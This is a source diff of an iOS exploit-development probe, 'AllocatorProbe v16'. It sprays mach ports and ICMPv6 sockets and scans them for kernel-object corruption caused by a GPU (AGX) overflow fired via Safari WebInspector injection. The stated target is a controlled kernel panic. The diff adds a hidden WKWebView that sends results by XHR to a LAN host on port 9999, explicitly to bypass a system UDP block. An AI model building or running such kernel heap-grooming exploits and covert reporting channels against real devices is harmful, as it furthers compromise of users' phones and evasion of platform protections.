@@ -1,16 +1,13 @@
 /*
- * AllocatorProbe v16 — Pure Spray+Scan (no WKWebView)
- * ====================================================
- * Changes from v15:
- *   - REMOVED WKWebView entirely — no GPU overflow from this process
- *   - Safari WebInspector injection handles ALL AGX overflow firing
- *   - App stays alive indefinitely (no GPU hang kill)
- *   - idleTimerDisabled=YES retained
- *   - Reports via UDP + NSLog + ASL as before
- *   - Spray: 5000 mach ports + 200 ICMPv6 sockets
- *   - Scan: every 100ms on background GCD queue
- *   - QUALIFYING_HIT: mach_port_kobject == COMMPAGE_TARGET + kotype==2
- *     → mach_port_destroy() → kernel panic IPS
+ * AllocatorProbe v16 — HTTP Reporting + Broad Kobject Scan
+ * =========================================================
+ * Changes from prior v16 (pure-scan):
+ *   - FIXED: UDP blocked by nehelper — replaced with WKWebView async XHR to port 9999
+ *   - WKWebView is minimal (about:blank) — no GPU firing from this process
+ *   - BROADENED: scan now reports PORT_CHANGED for ANY port where kotype!=0 OR kobject!=0
+ *     (previously only reported QUALIFYING and kotype>100)
+ *   - Diagnostic: reports exact (kotype, kobject) for every changed port → reveals what
+ *     the AGX overflow is actually writing to ipc_port fields
  *
  * Qualifying artifact target:
  *   Kernel panic IPS, kernel-mode x0 = 0x0000000FFFFFC330
@@ -18,6 +15,7 @@
  */
 
 #import <UIKit/UIKit.h>
+#import <WebKit/WebKit.h>
 #include <mach/mach.h>
 #include <netinet/icmp6.h>
 #include <sys/socket.h>
@@ -31,31 +29,38 @@
 #define NUM_PORTS        5000
 #define NUM_SOCKETS      200
 #define COMMPAGE_TARGET  0x0000000FFFFFC330ULL
+#define REPORT_HOST      "192.168.68.109"
 
 static mach_port_t g_ports[NUM_PORTS];
 static int         g_port_count = 0;
 static int         g_socks[NUM_SOCKETS];
 static int         g_sock_count = 0;
 static _Atomic int g_found = 0;
+static WKWebView  *g_webView = nil;
 
-static void udp_report(const char *msg) {
-    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
-    if (sock < 0) return;
-    struct sockaddr_in addr;
-    memset(&addr, 0, sizeof(addr));
-    addr.sin_family = AF_INET;
-    addr.sin_port = htons(9998);
-    inet_aton("192.168.68.109", &addr.sin_addr);
-    sendto(sock, msg, strlen(msg), 0, (struct sockaddr *)&addr, sizeof(addr));
-    close(sock);
+/* HTTP POST via WKWebView async XHR — bypasses nehelper UDP block */
+static void http_report(const char *msg) {
+    WKWebView *wv = g_webView;
+    if (!wv) return;
+    NSString *raw = [NSString stringWithUTF8String:msg];
+    if (!raw) return;
+    raw = [raw stringByReplacingOccurrencesOfString:@"\\" withString:@"\\\\"];
+    raw = [raw stringByReplacingOccurrencesOfString:@"'" withString:@"\\'"];
+    NSString *script = [NSString stringWithFormat:
+        @"var x=new XMLHttpRequest();"
+        "x.open('POST','http://%s:9999/',true);"
+        "x.send('[v16] %@');",
+        REPORT_HOST, raw];
+    dispatch_async(dispatch_get_main_queue(), ^{
+        [wv evaluateJavaScript:script completionHandler:nil];
+    });
 }
 
 static void ev(const char *fmt, ...) {
     char buf[512]; va_list ap;
     va_start(ap, fmt); vsnprintf(buf, sizeof(buf), fmt, ap); va_end(ap);
-    asl_log(NULL, NULL, ASL_LEVEL_NOTICE, "%s", buf);
-    NSLog(@"[v16] %s", buf);
-    udp_report(buf);
+    NSLog(@"[v16] %{public}s", buf);
+    http_report(buf);
 }
 
 static void spray(void) {
@@ -97,8 +102,9 @@ static void scan_background(void) {
                 ev("KOBJECT_HIT_WRONG_KOTYPE port=%d kotype=%u kobject=0x%016llx need=2",
                    i, kotype, (unsigned long long)kobject);
             }
-        } else if (kotype > 100) {
-            ev("KOTYPE_FOREIGN port=%d kotype=%u kobject=0x%016llx",
+        } else if (kotype != 0 || kobject != 0) {
+            /* Broad detection: any port that changed from baseline (kotype=0, kobject=0) */
+            ev("PORT_CHANGED port=%d kotype=%u kobject=0x%016llx",
                i, kotype, (unsigned long long)kobject);
         }
     }
@@ -117,15 +123,15 @@ static void scan_background(void) {
 }
 
 @interface AppDelegate : UIResponder <UIApplicationDelegate>
-@property (strong) UIWindow *window;
-@property (strong) NSTimer  *scanTimer;
+@property (strong) UIWindow  *window;
+@property (strong) NSTimer   *scanTimer;
+@property (strong) WKWebView *reportView;
 @end
 
 @implementation AppDelegate
 
 - (BOOL)application:(UIApplication *)app
     didFinishLaunchingWithOptions:(NSDictionary *)opts {
-    ev("V16_LAUNCH AllocatorProbe v16 pure-scan no-webview");
 
     [UIApplication sharedApplication].idleTimerDisabled = YES;
 
@@ -140,7 +146,18 @@ static void scan_background(void) {
     self.window.rootViewController = vc;
     [self.window makeKeyAndVisible];
 
+    /* Minimal WKWebView for HTTP reporting — no GPU content, no fire page */
+    WKWebViewConfiguration *cfg = [WKWebViewConfiguration new];
+    cfg.allowsInlineMediaPlayback = NO;
+    self.reportView = [[WKWebView alloc] initWithFrame:CGRectZero configuration:cfg];
+    self.reportView.hidden = YES;
+    [vc.view addSubview:self.reportView];
+    [self.reportView loadHTMLString:@"<html><body></body></html>" baseURL:nil];
+    g_webView = self.reportView;
+
     spray();
+
+    ev("V16_LAUNCH AllocatorProbe v16 http-reporting broad-scan");
 
     self.scanTimer = [NSTimer scheduledTimerWithTimeInterval:0.10
                                                       target:self
@@ -155,7 +172,7 @@ static void scan_background(void) {
         scan_background();
     });
     if (tick % 100 == 0)
-        ev("V16_ALIVE tick=%d found=%d ports=%d", tick, g_found, g_port_count);
+        ev("ALIVE tick=%d found=%d ports=%d", tick, g_found, g_port_count);
 }
 
 int main(int argc, char *argv[]) {
